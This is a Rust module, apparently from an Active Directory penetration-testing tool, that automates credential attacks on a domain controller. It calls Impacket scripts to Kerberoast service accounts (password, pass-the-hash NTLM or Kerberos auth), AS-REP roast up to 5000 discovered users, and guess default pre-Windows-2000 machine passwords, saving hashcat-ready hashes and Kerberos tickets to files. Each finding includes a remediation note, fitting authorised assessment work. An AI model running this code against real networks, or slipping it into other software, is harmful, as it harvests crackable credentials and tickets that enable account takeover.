use std::env;
use std::fs;
use std::path::PathBuf;
use std::process::Stdio;
use tokio::process::Command;
use tokio::time::{timeout, Duration};

use crate::auth_recon::AuthFinding;
use crate::output;

pub async fn run(
    target: &str,
    domain: &str,
    username: Option<&str>,
    password: Option<&str>,
    ntlm: Option<&str>,
    kerberos: bool,
    discovered_users: &[String],
) -> Vec<AuthFinding> {
    let mut findings = Vec::new();
    output::section("CREDENTIAL ATTACKS");
    output::info("Trying all supported credential attack paths with available data");

    // Kerberoast via available auth methods
    if let Some(user) = username {
        if let Some(pass) = password {
            attempt_getuserspns_password(target, domain, user, pass, &mut findings).await;
        }
        if let Some(hash) = ntlm {
            attempt_getuserspns_ntlm(target, domain, user, hash, &mut findings).await;
        }
        if kerberos {
            attempt_getuserspns_kerberos(target, domain, user, &mut findings).await;
        }
    }

    // AS-REP roasting:
    // 1) authenticated broad discovery if creds are available
    // 2) discovered-user no-auth spray as an additional path
    if let (Some(user), Some(pass)) = (username, password) {
        attempt_getnpusers_authenticated(target, domain, user, pass, &mut findings).await;
    } else if let (Some(user), Some(hash)) = (username, ntlm) {
        attempt_getnpusers_authenticated_ntlm(target, domain, user, hash, &mut findings).await;
    } else if let Some(user) = username {
        if kerberos {
            attempt_getnpusers_authenticated_kerberos(target, domain, user, &mut findings).await;
        }
    }

    if !discovered_users.is_empty() {
        attempt_getnpusers_noauth(target, domain, discovered_users, &mut findings).await;
    } else {
        output::warning("No discovered users available for AS-REP attempt");
    }

    // Pre2k default machine password attempts from discovered machine-like users
    let mut machine_candidates = discovered_users
        .iter()
        .filter(|u| u.ends_with('$'))
        .cloned()
        .collect::<Vec<_>>();
    machine_candidates.sort();
    machine_candidates.dedup();
    if !machine_candidates.is_empty() {
        attempt_pre2k_gettgt(target, domain, &machine_candidates, &mut findings).await;
    }

    findings
}

fn display_limited(items: &[String], limit: usize) -> String {
    if items.is_empty() {
        return String::new();
    }
    if items.len() <= limit {
        return items.join(", ");
    }
    let mut out = items[..limit].join(", ");
    out.push_str(", <snip>");
    out
}

fn read_hash_preview(path: &str, limit: usize) -> Option<String> {
    let content = fs::read_to_string(path).ok()?;
    let lines = content
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .map(ToOwned::to_owned)
        .collect::<Vec<_>>();
    if lines.is_empty() {
        return None;
    }
    if lines.len() <= limit {
        return Some(lines.join(" | "));
    }
    let mut out = lines[..limit].join(" | ");
    out.push_str(" | <snip>");
    Some(out)
}

fn parse_kerberoast_user(line: &str) -> Option<String> {
    // Typical hashcat line: $krb5tgs$23$*user$REALM$SPN*...
    if !line.contains("$krb5tgs$") {
        return None;
    }
    let first_star = line.find('*')?;
    let rest = &line[first_star + 1..];
    let end = rest.find('$')?;
    let user = rest[..end].trim();
    if user.is_empty() {
        None
    } else {
        Some(user.to_string())
    }
}

fn parse_kerberoast_user_fallback(line: &str) -> Option<String> {
    // Fallback for output like: ServicePrincipalName ... Name: user
    if let Some(idx) = line.find("Name:") {
        let user = line[idx + 5..].trim();
        if !user.is_empty() {
            return Some(user.to_string());
        }
    }
    None
}

fn parse_asrep_user(line: &str) -> Option<String> {
    // Typical hashcat line: $krb5asrep$23$user@REALM:...
    if !line.contains("$krb5asrep$") {
        return None;
    }
    let mut parts = line.split('$');
    let _ = parts.next();
    let _ = parts.next();
    let _ = parts.next();
    let user_realm = parts.next()?.trim();
    let user = user_realm
        .split('@')
        .next()
        .unwrap_or_default()
        .trim()
        .to_string();
    if user.is_empty() {
        None
    } else {
        Some(user)
    }
}

fn read_hash_users(path: &str, kind: &str, limit: usize) -> Option<String> {
    let content = fs::read_to_string(path).ok()?;
    let mut users = Vec::new();
    for line in content.lines().map(str::trim).filter(|l| !l.is_empty()) {
        let parsed = match kind {
            "kerberoast" => parse_kerberoast_user(line),
            "asrep" => parse_asrep_user(line),
            _ => None,
        };
        if let Some(u) = parsed {
            users.push(u);
        }
    }
    users.sort_by_key(|u| u.to_lowercase());
    users.dedup_by(|a, b| a.eq_ignore_ascii_case(b));
    if users.is_empty() {
        None
    } else {
        Some(display_limited(&users, limit))
    }
}

fn parse_users_from_text(text: &str, kind: &str, limit: usize) -> Option<String> {
    let mut users = Vec::new();
    for line in text.lines().map(str::trim).filter(|l| !l.is_empty()) {
        let parsed = match kind {
            "kerberoast" => {
                parse_kerberoast_user(line).or_else(|| parse_kerberoast_user_fallback(line))
            }
            "asrep" => parse_asrep_user(line),
            _ => None,
        };
        if let Some(u) = parsed {
            users.push(u);
        }
    }
    users.sort_by_key(|u| u.to_lowercase());
    users.dedup_by(|a, b| a.eq_ignore_ascii_case(b));
    if users.is_empty() {
        None
    } else {
        Some(display_limited(&users, limit))
    }
}

fn hash_lines_from_text(text: &str, marker: &str, limit: usize) -> Option<String> {
    let lines = text
        .lines()
        .map(str::trim)
        .filter(|l| l.contains(marker))
        .map(ToOwned::to_owned)
        .collect::<Vec<_>>();
    if lines.is_empty() {
        return None;
    }
    if lines.len() <= limit {
        return Some(lines.join(" | "));
    }
    let mut out = lines[..limit].join(" | ");
    out.push_str(" | <snip>");
    Some(out)
}

fn find_and_save_ccache(username: &str) -> Option<String> {
    let desired = format!("{}.ccache", username);
    if fs::metadata(&desired).is_ok() {
        return Some(desired);
    }

    let mut candidates = vec![
        format!("{}.ccache", username.trim_end_matches('$')),
        format!("{}$.ccache", username.trim_end_matches('$')),
        format!("{}.ccache", username.to_ascii_lowercase()),
        format!(
            "{}$.ccache",
            username.trim_end_matches('$').to_ascii_lowercase()
        ),
    ];
    candidates.sort();
    candidates.dedup();

    for c in candidates {
        if c == desired {
            continue;
        }
        if fs::metadata(&c).is_ok() && fs::rename(&c, &desired).is_ok() {
            return Some(desired);
        }
    }
    None
}

async fn attempt_getuserspns_password(
    target: &str,
    domain: &str,
    username: &str,
    password: &str,
    findings: &mut Vec<AuthFinding>,
) {
    let output_file = "kerberoast_hashes_password.txt";
    output::info(&format!(
        "Kerberoast target principal: {}/{} (password auth)",
        domain, username
    ));
    if let Some((bin, out_text)) = run_getuserspns(
        target,
        vec![
            "-request".to_string(),
            "-dc-ip".to_string(),
            target.to_string(),
            "-outputfile".to_string(),
            output_file.to_string(),
            format!("{}/{}:{}", domain, username, password),
        ],
    )
    .await
    {
        let preview = read_hash_preview(output_file, 10)
            .or_else(|| hash_lines_from_text(&out_text, "$krb5tgs$", 10));
        let attacked = read_hash_users(output_file, "kerberoast", 10)
            .or_else(|| parse_users_from_text(&out_text, "kerberoast", 10));
        if preview.is_none() {
            output::info(&format!("{} completed: no kerberoast hashes returned", bin));
            return;
        }
        let preview = preview.unwrap_or_else(|| "<hash file empty>".to_string());
        let attacked =
            attacked.unwrap_or_else(|| "<could not parse usernames from output>".to_string());
        output::kv("Kerberoast Usernames", &attacked);
        output::kv("Kerberoast Hashes", &preview);
        output::success(&format!("{} captured kerberoast data", bin));
        findings.push(AuthFinding {
            id: "ATTACK-KERBEROAST-PASSWORD".to_string(),
            severity: "high".to_string(),
            title: "Kerberoast hashes captured (password auth)".to_string(),
            evidence: format!(
                "Requester: {}/{} | Users: {} | Output: {} | {}",
                domain, username, attacked, output_file, preview
            ),
            recommendation:
                "Rotate impacted service account credentials and enforce strong secrets."
                    .to_string(),
        });
    }
}

async fn attempt_getuserspns_ntlm(
    target: &str,
    domain: &str,
    username: &str,
    ntlm: &str,
    findings: &mut Vec<AuthFinding>,
) {
    let output_file = "kerberoast_hashes_ntlm.txt";
    output::info(&format!(
        "Kerberoast target principal: {}/{} (NTLM auth)",
        domain, username
    ));
    let hash_fmt = if ntlm.contains(':') {
        ntlm.to_string()
    } else {
        format!("aad3b435b51404eeaad3b435b51404ee:{}", ntlm)
    };
    if let Some((bin, out_text)) = run_getuserspns(
        target,
        vec![
            "-request".to_string(),
            "-dc-ip".to_string(),
            target.to_string(),
            "-outputfile".to_string(),
            output_file.to_string(),
            "-hashes".to_string(),
            hash_fmt,
            format!("{}/{}", domain, username),
        ],
    )
    .await
    {
        let preview = read_hash_preview(output_file, 10)
            .or_else(|| hash_lines_from_text(&out_text, "$krb5tgs$", 10));
        let attacked = read_hash_users(output_file, "kerberoast", 10)
            .or_else(|| parse_users_from_text(&out_text, "kerberoast", 10));
        if preview.is_none() {
            output::info(&format!("{} completed: no kerberoast hashes returned", bin));
            return;
        }
        let preview = preview.unwrap_or_else(|| "<hash file empty>".to_string());
        let attacked =
            attacked.unwrap_or_else(|| "<could not parse usernames from output>".to_string());
        output::kv("Kerberoast Usernames", &attacked);
        output::kv("Kerberoast Hashes", &preview);
        output::success(&format!("{} captured kerberoast data", bin));
        findings.push(AuthFinding {
            id: "ATTACK-KERBEROAST-NTLM".to_string(),
            severity: "high".to_string(),
            title: "Kerberoast hashes captured (NTLM auth)".to_string(),
            evidence: format!(
                "Requester: {}/{} | Users: {} | Output: {} | {}",
                domain, username, attacked, output_file, preview
            ),
            recommendation: "Rotate impacted service account credentials and review NTLM usage."
                .to_string(),
        });
    }
}

async fn attempt_getuserspns_kerberos(
    target: &str,
    domain: &str,
    username: &str,
    findings: &mut Vec<AuthFinding>,
) {
    let output_file = "kerberoast_hashes_kerberos.txt";
    output::info(&format!(
        "Kerberoast target principal: {}/{} (Kerberos auth)",
        domain, username
    ));
    if let Some((bin, out_text)) = run_getuserspns(
        target,
        vec![
            "-request".to_string(),
            "-dc-ip".to_string(),
            target.to_string(),
            "-outputfile".to_string(),
            output_file.to_string(),
            "-k".to_string(),
            "-no-pass".to_string(),
            format!("{}/{}", domain, username),
        ],
    )
    .await
    {
        let preview = read_hash_preview(output_file, 10)
            .or_else(|| hash_lines_from_text(&out_text, "$krb5tgs$", 10));
        let attacked = read_hash_users(output_file, "kerberoast", 10)
            .or_else(|| parse_users_from_text(&out_text, "kerberoast", 10));
        if preview.is_none() {
            output::info(&format!("{} completed: no kerberoast hashes returned", bin));
            return;
        }
        let preview = preview.unwrap_or_else(|| "<hash file empty>".to_string());
        let attacked =
            attacked.unwrap_or_else(|| "<could not parse usernames from output>".to_string());
        output::kv("Kerberoast Usernames", &attacked);
        output::kv("Kerberoast Hashes", &preview);
        output::success(&format!("{} captured kerberoast data", bin));
        findings.push(AuthFinding {
            id: "ATTACK-KERBEROAST-KERBEROS".to_string(),
            severity: "high".to_string(),
            title: "Kerberoast hashes captured (Kerberos auth)".to_string(),
            evidence: format!(
                "Requester: {}/{} | Users: {} | Output: {} | {}",
                domain, username, attacked, output_file, preview
            ),
            recommendation:
                "Rotate impacted service account credentials and review delegation/ticket controls."
                    .to_string(),
        });
    }
}

async fn run_getuserspns(target: &str, args: Vec<String>) -> Option<(String, String)> {
    let bins = ["GetUserSPNs.py", "impacket-GetUserSPNs"];
    for bin in bins {
        let mut cmd = Command::new(bin);
        cmd.args(&args).stdin(Stdio::null());
        match timeout(Duration::from_secs(60), cmd.output()).await {
            Err(_) => {
                output::warning(&format!("{} timed out after 60s (skipping method)", bin));
                continue;
            }
            Ok(Err(_)) => continue,
            Ok(Ok(out)) if out.status.success() => {
                let mut text = String::new();
                text.push_str(&String::from_utf8_lossy(&out.stdout));
                text.push('\n');
                text.push_str(&String::from_utf8_lossy(&out.stderr));
                output::info(&format!("{} completed against {}", bin, target));
                return Some((bin.to_string(), text));
            }
            Ok(_) => continue,
        }
    }
    None
}

async fn attempt_getnpusers_noauth(
    target: &str,
    domain: &str,
    users: &[String],
    findings: &mut Vec<AuthFinding>,
) {
    let mut users_file: PathBuf = env::temp_dir();
    users_file.push("aydee_users_asrep.txt");
    let filtered = users
        .iter()
        .filter(|u| !u.is_empty())
        .take(5000)
        .cloned()
        .collect::<Vec<_>>();
    if filtered.is_empty() {
        return;
    }
    output::info(&format!(
        "AS-REP target usernames ({}): {}",
        filtered.len(),
        display_limited(&filtered, 10)
    ));
    if fs::write(&users_file, filtered.join("\n")).is_err() {
        return;
    }

    let output_file = "asreproast_hashes_allusers.txt";
    if let Some((bin, out_text)) = run_getnpusers(vec![
        format!("{}/", domain),
        "-dc-ip".to_string(),
        target.to_string(),
        "-usersfile".to_string(),
        users_file.to_string_lossy().to_string(),
        "-format".to_string(),
        "hashcat".to_string(),
        "-outputfile".to_string(),
        output_file.to_string(),
        "-no-pass".to_string(),
    ])
    .await
    {
        let preview = read_hash_preview(output_file, 10)
            .or_else(|| hash_lines_from_text(&out_text, "$krb5asrep$", 10));
        let attacked = read_hash_users(output_file, "asrep", 10)
            .or_else(|| parse_users_from_text(&out_text, "asrep", 10));
        if preview.is_none() {
            output::info(&format!(
                "{} completed: no AS-REP roastable users returned",
                bin
            ));
            return;
        }
        let preview = preview.unwrap_or_else(|| "<hash file empty>".to_string());
        let attacked =
            attacked.unwrap_or_else(|| "<could not parse usernames from output>".to_string());
        output::kv("AS-REP Usernames", &attacked);
        output::kv("AS-REP Hashes", &preview);
        output::success(&format!("{} captured AS-REP roast data", bin));
        findings.push(AuthFinding {
            id: "ATTACK-ASREPROAST-DISCOVERED-USERS".to_string(),
            severity: "high".to_string(),
            title: "AS-REP hashes captured from discovered users".to_string(),
            evidence: format!(
                "Targets: {} (input users: {}) | Output: {} | {}",
                attacked,
                filtered.len(),
                output_file,
                preview
            ),
            recommendation: "Enforce Kerberos pre-auth for impacted users and rotate credentials."
                .to_string(),
        });
    }
}

async fn attempt_getnpusers_authenticated(
    target: &str,
    domain: &str,
    username: &str,
    password: &str,
    findings: &mut Vec<AuthFinding>,
) {
    let output_file = "asreproast_hashes_allusers.txt";
    output::info(&format!(
        "AS-REP broad discovery using LDAP auth principal: {}/{}",
        domain, username
    ));
    if let Some((bin, out_text)) = run_getnpusers(vec![
        format!("{}/{}:{}", domain, username, password),
        "-request".to_string(),
        "-dc-ip".to_string(),
        target.to_string(),
        "-format".to_string(),
        "hashcat".to_string(),
        "-outputfile".to_string(),
        output_file.to_string(),
    ])
    .await
    {
        handle_asrep_result(
            &bin,
            &out_text,
            output_file,
            "all users via LDAP query",
            findings,
        );
    }
}

async fn attempt_getnpusers_authenticated_ntlm(
    target: &str,
    domain: &str,
    username: &str,
    ntlm: &str,
    findings: &mut Vec<AuthFinding>,
) {
    let output_file = "asreproast_hashes_allusers.txt";
    let hash_fmt = if ntlm.contains(':') {
        ntlm.to_string()
    } else {
        format!("aad3b435b51404eeaad3b435b51404ee:{}", ntlm)
    };
    output::info(&format!(
        "AS-REP broad discovery using NTLM auth principal: {}/{}",
        domain, username
    ));
    if let Some((bin, out_text)) = run_getnpusers(vec![
        format!("{}/{}", domain, username),
        "-hashes".to_string(),
        hash_fmt,
        "-request".to_string(),
        "-dc-ip".to_string(),
        target.to_string(),
        "-format".to_string(),
        "hashcat".to_string(),
        "-outputfile".to_string(),
        output_file.to_string(),
    ])
    .await
    {
        handle_asrep_result(
            &bin,
            &out_text,
            output_file,
            "all users via LDAP query",
            findings,
        );
    }
}

async fn attempt_getnpusers_authenticated_kerberos(
    target: &str,
    domain: &str,
    username: &str,
    findings: &mut Vec<AuthFinding>,
) {
    let output_file = "asreproast_hashes_allusers.txt";
    output::info(&format!(
        "AS-REP broad discovery using Kerberos auth principal: {}/{}",
        domain, username
    ));
    if let Some((bin, out_text)) = run_getnpusers(vec![
        format!("{}/{}", domain, username),
        "-k".to_string(),
        "-no-pass".to_string(),
        "-request".to_string(),
        "-dc-ip".to_string(),
        target.to_string(),
        "-format".to_string(),
        "hashcat".to_string(),
        "-outputfile".to_string(),
        output_file.to_string(),
    ])
    .await
    {
        handle_asrep_result(
            &bin,
            &out_text,
            output_file,
            "all users via LDAP query",
            findings,
        );
    }
}

fn handle_asrep_result(
    bin: &str,
    out_text: &str,
    output_file: &str,
    target_desc: &str,
    findings: &mut Vec<AuthFinding>,
) {
    let preview = read_hash_preview(output_file, 10)
        .or_else(|| hash_lines_from_text(out_text, "$krb5asrep$", 10));
    let attacked = read_hash_users(output_file, "asrep", 10)
        .or_else(|| parse_users_from_text(out_text, "asrep", 10));
    if preview.is_none() {
        output::info(&format!(
            "{} completed: no AS-REP roastable users returned",
            bin
        ));
        return;
    }
    let preview = preview.unwrap_or_else(|| "<hash file empty>".to_string());
    let attacked =
        attacked.unwrap_or_else(|| "<could not parse usernames from output>".to_string());
    output::kv("AS-REP Usernames", &attacked);
    output::kv("AS-REP Hashes", &preview);
    output::success(&format!("{} captured AS-REP roast data", bin));
    findings.push(AuthFinding {
        id: "ATTACK-ASREPROAST-DISCOVERED-USERS".to_string(),
        severity: "high".to_string(),
        title: "AS-REP hashes captured from domain users".to_string(),
        evidence: format!(
            "Targets: {} ({}) | Output: {} | {}",
            attacked, target_desc, output_file, preview
        ),
        recommendation: "Enforce Kerberos pre-auth for impacted users and rotate credentials."
            .to_string(),
    });
}

async fn run_getnpusers(args: Vec<String>) -> Option<(String, String)> {
    let bins = ["GetNPUsers.py", "impacket-GetNPUsers"];
    for bin in bins {
        let mut cmd = Command::new(bin);
        cmd.args(&args).stdin(Stdio::null());
        match timeout(Duration::from_secs(60), cmd.output()).await {
            Err(_) => {
                output::warning(&format!("{} timed out after 60s (skipping method)", bin));
                continue;
            }
            Ok(Err(_)) => continue,
            Ok(Ok(out)) if out.status.success() => {
                let mut text = String::new();
                text.push_str(&String::from_utf8_lossy(&out.stdout));
                text.push('\n');
                text.push_str(&String::from_utf8_lossy(&out.stderr));
                return Some((bin.to_string(), text));
            }
            Ok(_) => continue,
        }
    }
    None
}

async fn attempt_pre2k_gettgt(
    target: &str,
    domain: &str,
    machine_users: &[String],
    findings: &mut Vec<AuthFinding>,
) {
    let bins = ["getTGT.py", "impacket-getTGT"];
    let mut success = Vec::new();

    for machine_account in machine_users.iter().take(64) {
        let machine = machine_account.trim_end_matches('$');
        if machine.is_empty() {
            continue;
        }
        let guess = machine.to_ascii_lowercase();
        let principal = format!("{}/{}$:{}", domain, machine, guess);
        let mut worked = false;
        for bin in bins {
            let mut cmd = Command::new(bin);
            cmd.arg("-dc-ip")
                .arg(target)
                .arg(&principal)
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .stdin(Stdio::null());
            if let Ok(Ok(out)) = timeout(Duration::from_secs(30), cmd.output()).await {
                if out.status.success() {
                    worked = true;
                    break;
                }
            }
        }
        if worked {
            let user_label = format!("{}$", machine);
            let ccache_saved = find_and_save_ccache(&user_label)
                .unwrap_or_else(|| format!("{}.ccache", user_label));
            success.push(format!(
                "{} / {} / ticket={}",
                user_label, guess, ccache_saved
            ));
            output::kv("TGT Saved", &ccache_saved);
        }
    }

    if !success.is_empty() {
        findings.push(AuthFinding {
            id: "ATTACK-PRE2K-DEFAULTPWD".to_string(),
            severity: "critical".to_string(),
            title: "Pre2k machine default-password authentication succeeded".to_string(),
            evidence: success
                .iter()
                .take(10)
                .cloned()
                .chain(std::iter::once("<snip>".to_string()).take((success.len() > 10) as usize))
                .collect::<Vec<_>>()
                .join(", "),
            recommendation: "Immediately reset affected machine account passwords and disable stale pre-created computer accounts.".to_string(),
        });
    }
}
